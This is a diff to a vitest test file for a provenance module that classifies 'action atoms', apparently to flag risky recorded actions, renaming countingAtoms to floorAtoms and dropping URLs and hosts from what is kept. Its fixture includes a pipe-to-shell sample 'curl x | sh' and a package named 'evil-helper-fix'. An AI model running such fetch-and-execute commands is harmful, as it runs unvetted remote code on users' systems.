@@ -5,7 +5,7 @@ import { join } from 'node:path';
 import { describe, expect, it } from 'vitest';
 import {
   atomsForAction,
-  countingAtoms,
+  floorAtoms,
   knownPackages,
   originClasses,
 } from '../../src/provenance/action-atoms.js';
@@ -224,7 +224,7 @@ describe('originClasses', () => {
   });
 });
 
-describe('countingAtoms', () => {
+describe('floorAtoms', () => {
   const atoms = [
     { kind: 'pkg', value: 'evil-helper-fix' },
     { kind: 'pipe_shell', value: 'curl x | sh' },
@@ -233,14 +233,12 @@ describe('countingAtoms', () => {
     { kind: 'host', value: 'x.example' },
   ] as const;
 
-  it('keeps packages, pipe-to-shell and encoded blobs whatever the action is', () => {
-    expect(countingAtoms(atoms, []).map((a) => a.kind)).toEqual(['pkg', 'pipe_shell', 'encoded']);
+  it('keeps packages, pipe-to-shell and encoded blobs', () => {
+    expect(floorAtoms(atoms).map((a) => a.kind)).toEqual(['pkg', 'pipe_shell', 'encoded']);
   });
 
-  it('keeps URLs and hosts too when the action is network-shaped', () => {
-    for (const cls of ['shell.network', 'git.push_external', 'shell.exec_encoded'] as const)
-      expect(countingAtoms(atoms, [cls])).toHaveLength(5);
-    expect(countingAtoms(atoms, ['network.fetch'])).toHaveLength(3);
+  it('never keeps a URL or a host: a lost flagged record has tainted the session already', () => {
+    expect(floorAtoms(atoms.filter((a) => a.kind === 'url' || a.kind === 'host'))).toEqual([]);
   });
 });
 
